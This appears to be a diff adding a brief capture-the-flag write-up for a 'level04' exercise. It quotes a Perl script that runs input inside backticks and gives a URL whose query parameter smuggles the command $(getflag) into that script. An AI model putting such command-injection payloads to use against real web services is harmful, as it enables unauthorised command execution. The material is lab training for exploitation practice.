@@ -1,0 +1,10 @@
+$> cat level04.pl
+[...]
+  print `echo $y 2>&1`;
+[...]
+
+# Code is being executed with the backticks
+
+# We need to inject our getflag argument here
+
+(navigator) http://$(VM_IP):4747?x=$(getflag)
